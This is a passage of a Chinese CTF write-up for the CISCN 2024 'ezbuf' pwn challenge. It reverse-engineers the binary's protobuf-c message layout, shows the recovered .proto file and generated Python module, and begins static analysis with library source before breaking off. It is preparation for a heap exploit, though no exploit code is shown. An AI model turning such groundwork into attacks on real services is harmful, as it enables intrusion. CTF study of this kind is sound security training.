class="hljs-comment">/* flags */</span><br>    <span class="hljs-number">0</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>    <span class="hljs-comment">/* reserved1,reserved2, etc */</span><br>  &#125;,<br>  &#123;<br>    <span class="hljs-string">&quot;b&quot;</span>,<br>    <span class="hljs-number">2</span>,<br>    PROTOBUF_C_LABEL_NONE,<br>    PROTOBUF_C_TYPE_SINT64,<br>    <span class="hljs-number">0</span>,   <span class="hljs-comment">/* quantifier_offset */</span><br>    offsetof(Test, b),<br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-number">0</span>,             <span class="hljs-comment">/* flags */</span><br>    <span class="hljs-number">0</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>    <span class="hljs-comment">/* reserved1,reserved2, etc */</span><br>  &#125;,<br>  &#123;<br>    <span class="hljs-string">&quot;c&quot;</span>,<br>    <span class="hljs-number">3</span>,<br>    PROTOBUF_C_LABEL_NONE,<br>    PROTOBUF_C_TYPE_UINT64,<br>    <span class="hljs-number">0</span>,   <span class="hljs-comment">/* quantifier_offset */</span><br>    offsetof(Test, c),<br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-number">0</span>,             <span class="hljs-comment">/* flags */</span><br>    <span class="hljs-number">0</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>    <span class="hljs-comment">/* reserved1,reserved2, etc */</span><br>  &#125;,<br>&#125;;<br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> test__field_indices_by_name[] = &#123;<br>  <span class="hljs-number">0</span>,   <span class="hljs-comment">/* field[0] = a */</span><br>  <span class="hljs-number">1</span>,   <span class="hljs-comment">/* field[1] = b */</span><br>  <span class="hljs-number">2</span>,   <span class="hljs-comment">/* field[2] = c */</span><br>&#125;;<br><span class="hljs-type">static</span> <span class="hljs-type">const</span> ProtobufCIntRange test__number_ranges[<span class="hljs-number">1</span> + <span class="hljs-number">1</span>] =<br>&#123;<br>  &#123; <span class="hljs-number">1</span>, <span class="hljs-number">0</span> &#125;,<br>  &#123; <span class="hljs-number">0</span>, <span class="hljs-number">3</span> &#125;<br>&#125;;<br><span class="hljs-type">const</span> ProtobufCMessageDescriptor test__descriptor =<br>&#123;<br>  PROTOBUF_C__MESSAGE_DESCRIPTOR_MAGIC,<br>  <span class="hljs-string">&quot;test&quot;</span>,<br>  <span class="hljs-string">&quot;Test&quot;</span>,<br>  <span class="hljs-string">&quot;Test&quot;</span>,<br>  <span class="hljs-string">&quot;&quot;</span>,<br>  <span class="hljs-keyword">sizeof</span>(Test),<br>  <span class="hljs-number">3</span>,<br>  test__field_descriptors,<br>  test__field_indices_by_name,<br>  <span class="hljs-number">1</span>,  test__number_ranges,<br>  (ProtobufCMessageInit) test__init,<br>  <span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>    <span class="hljs-comment">/* reserved[123] */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>我们查看这两个结构体的源码</p><ul><li>ProtobufCMessageDescriptor</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Describes a message.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ProtobufCMessageDescriptor</span> &#123;</span><br><span class="hljs-comment">/** Magic value checked to ensure that the API is used correctly. */</span><br><span class="hljs-type">uint32_t</span>magic;<br><br><span class="hljs-comment">/** The qualified name (e.g., &quot;namespace.Type&quot;). */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span>*name;<br><span class="hljs-comment">/** The unqualified name as given in the .proto file (e.g., &quot;Type&quot;). */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span>*short_name;<br><span class="hljs-comment">/** Identifier used in generated C code. */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span>*c_name;<br><span class="hljs-comment">/** The dot-separated namespace. */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span>*package_name;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Size in bytes of the C structure representing an instance of this</span><br><span class="hljs-comment"> * type of message.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">size_t</span>sizeof_message;<br><br><span class="hljs-comment">/** Number of elements in `fields`. */</span><br><span class="hljs-type">unsigned</span>n_fields;<br><span class="hljs-comment">/** Field descriptors, sorted by tag number. */</span><br><span class="hljs-type">const</span> ProtobufCFieldDescriptor*fields;<br><span class="hljs-comment">/** Used for looking up fields by name. */</span><br><span class="hljs-type">const</span> <span class="hljs-type">unsigned</span>*fields_sorted_by_name;<br><br><span class="hljs-comment">/** Number of elements in `field_ranges`. */</span><br><span class="hljs-type">unsigned</span>n_field_ranges;<br><span class="hljs-comment">/** Used for looking up fields by id. */</span><br><span class="hljs-type">const</span> ProtobufCIntRange*field_ranges;<br><br><span class="hljs-comment">/** Message initialisation function. */</span><br>ProtobufCMessageInitmessage_init;<br><br><span class="hljs-comment">/** Reserved for future use. */</span><br><span class="hljs-type">void</span>*reserved1;<br><span class="hljs-comment">/** Reserved for future use. */</span><br><span class="hljs-type">void</span>*reserved2;<br><span class="hljs-comment">/** Reserved for future use. */</span><br><span class="hljs-type">void</span>*reserved3;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>ProtobufCFieldDescriptor</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ProtobufCFieldDescriptor</span> &#123;</span><br><span class="hljs-comment">/** Name of the field as given in the .proto file. */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span>*name;<br><span class="hljs-comment">/** Tag value of the field as given in the .proto file. */</span><br><span class="hljs-type">uint32_t</span>id;<br><span class="hljs-comment">/** Whether the field is `REQUIRED`, `OPTIONAL`, or `REPEATED`. */</span><br>ProtobufCLabellabel;<br><span class="hljs-comment">/** The type of the field. */</span><br>ProtobufCTypetype;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * The offset in bytes of the message&#x27;s C structure&#x27;s quantifier field</span><br><span class="hljs-comment"> * (the `has_MEMBER` field for optional members or the `n_MEMBER` field</span><br><span class="hljs-comment"> * for repeated members or the case enum for oneofs).</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span>quantifier_offset;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * The offset in bytes into the message&#x27;s C structure for the member</span><br><span class="hljs-comment"> * itself.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span>offset;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * A type-specific descriptor.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the</span><br><span class="hljs-comment"> * corresponding `ProtobufCEnumDescriptor`.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to</span><br><span class="hljs-comment"> * the corresponding `ProtobufCMessageDescriptor`.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Otherwise this field is NULL.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">const</span> <span class="hljs-type">void</span>*descriptor; <span class="hljs-comment">/* for MESSAGE and ENUM types */</span><br><span class="hljs-comment">/** The default value for this field, if defined. May be NULL. */</span><br><span class="hljs-type">const</span> <span class="hljs-type">void</span>*default_value;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * A flag word. Zero or more of the bits defined in the</span><br><span class="hljs-comment"> * `ProtobufCFieldFlag` enum may be set.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">uint32_t</span>flags;<br><span class="hljs-comment">/** Reserved for future use. */</span><br><span class="hljs-type">unsigned</span>reserved_flags;<br><span class="hljs-comment">/** Reserved for future use. */</span><br><span class="hljs-type">void</span>*reserved2;<br><span class="hljs-comment">/** Reserved for future use. */</span><br><span class="hljs-type">void</span>*reserved3;<br>&#125;;<br></code></pre></td></tr></table></figure><p>结构体中又涉及到了一个枚举类型 ProtobufCType</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>PROTOBUF_C_TYPE_INT32,      <span class="hljs-comment">/**&lt; int32 */</span><br>PROTOBUF_C_TYPE_SINT32,     <span class="hljs-comment">/**&lt; signed int32 */</span><br>PROTOBUF_C_TYPE_SFIXED32,   <span class="hljs-comment">/**&lt; signed int32 (4 bytes) */</span><br>PROTOBUF_C_TYPE_INT64,      <span class="hljs-comment">/**&lt; int64 */</span><br>PROTOBUF_C_TYPE_SINT64,     <span class="hljs-comment">/**&lt; signed int64 */</span><br>PROTOBUF_C_TYPE_SFIXED64,   <span class="hljs-comment">/**&lt; signed int64 (8 bytes) */</span><br>PROTOBUF_C_TYPE_UINT32,     <span class="hljs-comment">/**&lt; unsigned int32 */</span><br>PROTOBUF_C_TYPE_FIXED32,    <span class="hljs-comment">/**&lt; unsigned int32 (4 bytes) */</span><br>PROTOBUF_C_TYPE_UINT64,     <span class="hljs-comment">/**&lt; unsigned int64 */</span><br>PROTOBUF_C_TYPE_FIXED64,    <span class="hljs-comment">/**&lt; unsigned int64 (8 bytes) */</span><br>PROTOBUF_C_TYPE_FLOAT,      <span class="hljs-comment">/**&lt; float */</span><br>PROTOBUF_C_TYPE_DOUBLE,     <span class="hljs-comment">/**&lt; double */</span><br>PROTOBUF_C_TYPE_BOOL,       <span class="hljs-comment">/**&lt; boolean */</span><br>PROTOBUF_C_TYPE_ENUM,       <span class="hljs-comment">/**&lt; enumerated type */</span><br>PROTOBUF_C_TYPE_STRING,     <span class="hljs-comment">/**&lt; UTF-8 or ASCII string */</span><br>PROTOBUF_C_TYPE_BYTES,      <span class="hljs-comment">/**&lt; arbitrary byte sequence */</span><br>PROTOBUF_C_TYPE_MESSAGE,    <span class="hljs-comment">/**&lt; nested message */</span><br>&#125; ProtobufCType;<br></code></pre></td></tr></table></figure><p>更多相关信息请查看 <a href="https://github.com/protobuf-c/protobuf-c">protobuf-c源码仓库</a>、<a href="https://protobuf-c.github.io/protobuf-c">protobuf-c官方文档</a></p><p>现在我们得知了消息的结构体 ProtobufCMessageDescriptor<br>也得知消息中所有成员的结构体 ProtobufCFieldDescriptor<br>还有每个成员的类型 ProtobufCType<br>利用这两个结构体和这个类型枚举便可以开始逆向程序，还原protobuf结构体了</p><h3 id="程序逆向"><a href="#程序逆向" class="headerlink" title="程序逆向"></a>程序逆向</h3><h4 id="protobuf-message逆向"><a href="#protobuf-message逆向" class="headerlink" title="protobuf message逆向"></a>protobuf message逆向</h4><p>分析ProtobufCMessageDescriptor<br><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-ProtobufCMessageDescriptor.png"></p><p>我在ida中还原了 ProtobufCMessageDescriptor 结构体，便于观察，实际做题可以不用还原<br><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-structure-insert.png"></p><p>再将之前数据段的变量的类型转为该结构体，得到如下结果<br><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-data-struct.png"></p><p>发现n_fileds为5,表明其中含有5个变量，点进fields分析每个field</p><p><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-ProtobufCFieldDescriptor-field1.png"></p><p>分析出第一个变量为bytes型，名为whatcon的变量，按照这样的方法依次提取出所有field，写到heybro.proto文件中</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">syntax</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;proto3&quot;</span><span class="hljs-comment">; //proto version 2 or 3</span><br><br>message heybro&#123;<br>    bytes whatcon <span class="hljs-operator">=</span> <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>    sint64 whattodo <span class="hljs-operator">=</span> <span class="hljs-number">2</span><span class="hljs-comment">;</span><br>    sint64 whatidx <span class="hljs-operator">=</span> <span class="hljs-number">3</span><span class="hljs-comment">;</span><br>    sint64 whatsize <span class="hljs-operator">=</span> <span class="hljs-number">4</span><span class="hljs-comment">;</span><br>    uint32 whatsthis <span class="hljs-operator">=</span> <span class="hljs-number">5</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>利用<code>protoc heybro.proto --python_out=./</code>命令生成python语言的代码，得到一个python文件，可以在exp中导入，构建相应的protobuf包</p><p>生成的heybro_pb2.py文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># Generated by the protocol buffer compiler.  DO NOT EDIT!</span><br><span class="hljs-comment"># source: heybro.proto</span><br><span class="hljs-string">&quot;&quot;&quot;Generated protocol buffer code.&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> google.protobuf.internal <span class="hljs-keyword">import</span> builder <span class="hljs-keyword">as</span> _builder<br><span class="hljs-keyword">from</span> google.protobuf <span class="hljs-keyword">import</span> descriptor <span class="hljs-keyword">as</span> _descriptor<br><span class="hljs-keyword">from</span> google.protobuf <span class="hljs-keyword">import</span> descriptor_pool <span class="hljs-keyword">as</span> _descriptor_pool<br><span class="hljs-keyword">from</span> google.protobuf <span class="hljs-keyword">import</span> symbol_database <span class="hljs-keyword">as</span> _symbol_database<br><span class="hljs-comment"># @@protoc_insertion_point(imports)</span><br><br>_sym_db = _symbol_database.Default()<br><br><br><br><br>DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(<span class="hljs-string">b&#x27;\n\x0cheybro.proto\&quot;a\n\x06heybro\x12\x0f\n\x07whatcon\x18\x01 \x01(\x0c\x12\x10\n\x08whattodo\x18\x02 \x01(\x12\x12\x0f\n\x07whatidx\x18\x03 \x01(\x12\x12\x10\n\x08whatsize\x18\x04 \x01(\x12\x12\x11\n\twhatsthis\x18\x05 \x01(\rb\x06proto3&#x27;</span>)<br><br>_builder.BuildMessageAndEnumDescriptors(DESCRIPTOR, <span class="hljs-built_in">globals</span>())<br>_builder.BuildTopDescriptorsAndMessages(DESCRIPTOR, <span class="hljs-string">&#x27;heybro_pb2&#x27;</span>, <span class="hljs-built_in">globals</span>())<br><span class="hljs-keyword">if</span> _descriptor._USE_C_DESCRIPTORS == <span class="hljs-literal">False</span>:<br><br>  DESCRIPTOR._options = <span class="hljs-literal">None</span><br>  _HEYBRO._serialized_start=<span class="hljs-number">16</span><br>  _HEYBRO._serialized_end=<span class="hljs-number">113</span><br><span class="hljs-comment"># @@protoc_insertion_point(module_scope)</span><br></code></pre></td></tr></table></figure><h4 id="python使用protobuf"><a href="#python使用protobuf" class="headerlink" title="python使用protobuf"></a>python使用protobuf</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> heybro_pb2 <span class="hljs-comment"># 不要加.py</span><br>data = heybro_pb2.heybro() <span class="hljs-comment"># 方法名称跟随.proto中结构体名称变化</span><br>data.whattodo = todo<br>data.whatcon = content<br>data.whatidx = index<br>data.whatsize = size<br>data.whatsthis = this<br>data.SerializeToString() <span class="hljs-comment"># 转换成bytes</span><br></code></pre></td></tr></table></figure><h4 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h4><p>先看看主函数，稍微改了点名字，加了点注释<br><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-main.png"></p><p>再看看menu函数<br><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-menu.png"></p><p>我们可以看到，程序读取输入，然后调用sub_1C87()解包数据，这个函数会直接调用另一个函数<br><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-sub_1C87.png"></p><p>我已经给这个函数改名了，这个函数是protobuf_c_message_unpack函数</p><p>protobuf_c_message_unpack函数的源码，可以粗略看看，主要是看看这个函数对堆有没有影响</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br></pre></td><td class="code"><pre><code class="hljs c">ProtobufCMessage *<br><span class="hljs-title function_">protobuf_c_message_unpack</span><span class="hljs-params">(<span class="hljs-type">const</span> ProtobufCMessageDescriptor *desc,</span><br><span class="hljs-params">  ProtobufCAllocator *allocator,</span><br><span class="hljs-params">  <span class="hljs-type">size_t</span> len, <span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span> *data)</span><br>&#123;<br>ProtobufCMessage *rv;<br><span class="hljs-type">size_t</span> rem = len;<br><span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span> *at = data;<br><span class="hljs-type">const</span> ProtobufCFieldDescriptor *last_field = desc-&gt;fields + <span class="hljs-number">0</span>;<br>ScannedMember first_member_slab[<span class="hljs-number">1UL</span> &lt;&lt;<br>FIRST_SCANNED_MEMBER_SLAB_SIZE_LOG2];<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * scanned_member_slabs[i] is an array of arrays of ScannedMember.</span><br><span class="hljs-comment"> * The first slab (scanned_member_slabs[0] is just a pointer to</span><br><span class="hljs-comment"> * first_member_slab), above. All subsequent slabs will be allocated</span><br><span class="hljs-comment"> * using the allocator.</span><br><span class="hljs-comment"> */</span><br>ScannedMember *scanned_member_slabs[MAX_SCANNED_MEMBER_SLAB + <span class="hljs-number">1</span>];<br><span class="hljs-type">unsigned</span> which_slab = <span class="hljs-number">0</span>; <span class="hljs-comment">/* the slab we are currently populating */</span><br><span class="hljs-type">unsigned</span> in_slab_index = <span class="hljs-number">0</span>; <span class="hljs-comment">/* number of members in the slab */</span><br><span class="hljs-type">size_t</span> n_unknown = <span class="hljs-number">0</span>;<br><span class="hljs-type">unsigned</span> f;<br><span class="hljs-type">unsigned</span> j;<br><span class="hljs-type">unsigned</span> i_slab;<br><span class="hljs-type">unsigned</span> last_field_index = <span class="hljs-number">0</span>;<br><span class="hljs-type">unsigned</span> required_fields_bitmap_len;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> required_fields_bitmap_stack[<span class="hljs-number">16</span>];<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *required_fields_bitmap = required_fields_bitmap_stack;<br>protobuf_c_boolean required_fields_bitmap_alloced = FALSE;<br><br>ASSERT_IS_MESSAGE_DESCRIPTOR(desc);<br><br><span class="hljs-keyword">if</span> (allocator == <span class="hljs-literal">NULL</span>)<br>allocator = &amp;protobuf_c__allocator;<br><br>rv = do_alloc(allocator, desc-&gt;sizeof_message);<br><span class="hljs-keyword">if</span> (!rv)<br><span class="hljs-keyword">return</span> (<span class="hljs-literal">NULL</span>);<br>scanned_member_slabs[<span class="hljs-number">0</span>] = first_member_slab;<br><br>required_fields_bitmap_len = (desc-&gt;n_fields + <span class="hljs-number">7</span>) / <span class="hljs-number">8</span>;<br><span class="hljs-keyword">if</span> (required_fields_bitmap_len &gt; <span class="hljs-keyword">sizeof</span>(required_fields_bitmap_stack)) &#123;<br>required_fields_bitmap = do_alloc(allocator, required_fields_bitmap_len);<br><span class="hljs-keyword">if</span> (!required_fields_bitmap) &#123;<br>do_free(allocator, rv);<br><span class="hljs-keyword">return</span> (<span class="hljs-literal">NULL</span>);<br>&#125;<br>required_fields_bitmap_alloced = TRUE;<br>&#125;<br><span class="hljs-built_in">memset</span>(required_fields_bitmap, <span class="hljs-number">0</span>, 